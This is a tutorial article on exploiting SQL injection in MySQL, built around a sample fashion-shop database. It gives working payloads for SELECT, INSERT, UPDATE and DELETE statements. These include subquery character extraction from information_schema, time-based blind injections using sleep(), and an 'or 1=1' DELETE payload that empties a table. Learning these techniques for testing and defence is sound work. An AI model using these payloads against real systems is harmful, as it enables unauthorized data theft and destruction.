SQL Injection Exploit
=====
In this article, we will discuss about how to exploit SQL Injection in MySQL. Instead of going through all of its type, we will try to inject into 4 statements: SELECT, INSERT, DELETE and UPDATE, with different injection points. Let's imagine with only SELECT statement, the result of the query will return to us, the rest will be hidden.
Below is the script to create a simple database:
```sql
CREATE DATABASE fashion_shop_db;
use fashion_shop_db;
-- Create Category Table
Drop TABLE IF EXISTS Category;
CREATE TABLE Category (
    category_id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL
);

-- Create Product Table
Drop TABLE IF EXISTS Product;
CREATE TABLE Product (
    product_id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    price DECIMAL(10, 2) NOT NULL,
    stock_quantity INT NOT NULL,
    category_id INT,
    FOREIGN KEY (category_id) REFERENCES Category(category_id)
);

-- Insert example values into Category Table
INSERT INTO Category (name) VALUES
('Men'),
('Women');

-- Insert example values into Product Table
INSERT INTO Product (name, description, price, stock_quantity, category_id) VALUES
('Men\'s T-shirt', 'Cotton T-shirt with a round neck', 20.00, 50, 1),
('Men\'s Jeans', 'Blue denim jeans with a slim fit', 40.00, 30, 1),
('Men\'s Sunglasses', 'Polarized sunglasses with UV protection', 15.00, 20, 1),
('Men\'s Sneakers', 'Comfortable running sneakers', 60.00, 25, 1),
('Men\'s Jacket', 'Water-resistant windbreaker jacket', 80.00, 10, 1),
('Men\'s Hoodie', 'Fleece hoodie with adjustable drawstring', 35.00, 20, 1),
('Men\'s Watch', 'Stainless steel wristwatch with leather strap', 150.00, 10, 1),
('Men\'s Sandals', 'Casual sandals with adjustable straps', 30.00, 22, 1),
('Women\'s T-shirt', 'Cotton T-shirt with a round neck', 20.00, 50, 2),
('Women\'s Jeans', 'Blue denim jeans with a slim fit', 40.00, 30, 2),
('Women\'s Sunglasses', 'Polarized sunglasses with UV protection', 15.00, 20, 2),
('Women\'s Sneakers', 'Comfortable running sneakers', 60.00, 25, 2),
```
The database has 2 tables: `Product` and `Category`, yet we will mainly work with Product table

### 1. SQL Injection in SELECT statement
Here's the query for testing:
```sql
$query= SELECT * FROM Product WHERE product_id = $user_input
$query = SELECT * FROM Product WHERE price = ? limit $user_input
$query = SELECT $user_input FROM Product
```
The last query is quite unfamiliar as the injection point comes before the `FROM` keyword. This query can be used to return a specific column in a table. Let's start with the first query. MySQL supports subquery, so we can use that feature to start a new query in this case :
```sql
select ascii(substr((select @@version),1,1))-50
```
This payload returns the first character of the database version and turns it into `ASCII` value. I minus by 50 to make the product_id small in case we don't have many products created. Therefore, the whole query will loke like this: 
```sql
SELECT * FROM Product WHERE product_id = (select ascii(substr((select @@version),1,1))-50)
```
We can infer the first letter of the database version by observing which product is returned and performing some simple calculations. Repeat this technique to extract the full database version. For further exploitation, we can modify the payload to extract valuable information. For example, we can use this payload to extract the table name: 
```sql
SELECT* FROM Product where product_id = (SELECT ASCII(substr((SELECT table_name FROM information_schema.tables LIMIT 1,1),1,1))-110)
```
Let's move on the next query:
```sql
$query = SELECT * FROM Product WHERE price = ? limit $user_input
```

> The  `LIMIT`  clause can be used to constrain the number of rows returned by the  [`SELECT`](https://dev.mysql.com/doc/refman/8.4/en/select.html "15.2.13 SELECT Statement")  statement.  `LIMIT`  takes one or two numeric arguments, which must both be nonnegative integer constants, with these exceptions:
> -   Within prepared statements,  `LIMIT`  parameters can be specified using  `?`  placeholder markers.
 > -   Within stored programs,  `LIMIT`  parameters can be specified using integer-valued routine parameters or local variables.

As the documentation of MySQL mentioned, it only accepts literal integer, meaning that we cannot enter anything other than integer. In this case, it's likely that we cannot inject our payload here. 

Finally, let's examine the most tricky injection point. It's so uncommon that there's an injection point before the `FROM` keyword, yet still exists. In this situation, we can use `UNION SELECT` to inject our payload. 
```sql
SELECT sleep(1) UNION SELECT IF(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1,1),1,1) = 'p',(SELECT sleep(3)),1) -- from information_schema.tables -- FROM Product WHERE price between 20 and 30 LIMIT 1
```
In the above query, I first let the program `sleep` for 1 second to confirm if it's vulnerable. Next, I use `UNION SELECT` to start a new query with the `IF` clause, which is used to guess each character of a table in the database. The program will sleep 4 seconds in total if the condition matches.

### 2. SQL Injection in INSERT Statement
We will keep the same structure as `SELECT ` statement. First, here's the query for testing:

```sql
INSERT INTO Product(name, description, price, stock_quantity, category_id) VALUES
("$user_input", ?, ?, ?, ?)
```	
MySQL allows expression as a value, therefore we can easily injection a blind payload in this case by using `or` operand. The whole query will look like this. 

```sql
INSERT INTO Product(name, description, price, stock_quantity, category_id) VALUES ("1" and (select if((substr(database(),1,1)='f'),(select sleep(2)),0)) and "",1,1,1,1); 
```
We use the same technique to extract each character of the database name being used. Note that this technique can only be used for MySQL. 

### 3. SQL Injection in DELETE and UPDATE Statement

The way to exploit these 2 statements is quite similar as injection points often come after **WHERE** clause

```sql
$query = UPDATE Product SET price= ? WHERE product_id=$user_input
$query = DELETE FROM Product WHERE product_id=$user_input
```
We can use the same payload for 2 queries. This can be done by simply input a valid value and then use `and` operand to start a new subquery. Our payload will look like this: 
```sql
UPDATE Product SET price= 1 WHERE product_id = 1 and (select if(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1) = 'p',(select sleep(3)),1));
DELETE FROM Product WHERE product_id= 3 and (select if(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1) = 'p',(select sleep(3)),1));
```
We simply use an `if` clause with time-based payload to extract information of the database. This is the same as injection in`SELECT` statement with injection point after **WHERE** clause

However, we have to be careful when testing with `DELETE` statement. For example if we inject the payload `or 1=1 -- ` into the query 
```sql
$query = DELETE FROM Product WHERE product_id=$user_input
```
Then all instances inside `Product` table will be deleted.

We've just gone through different ways to exploit SQL injection. This is a severe bug but still exists in the wild. The developers should be aware of its impact as well as remember to validate user inputs carefully. Happy hacking!!!
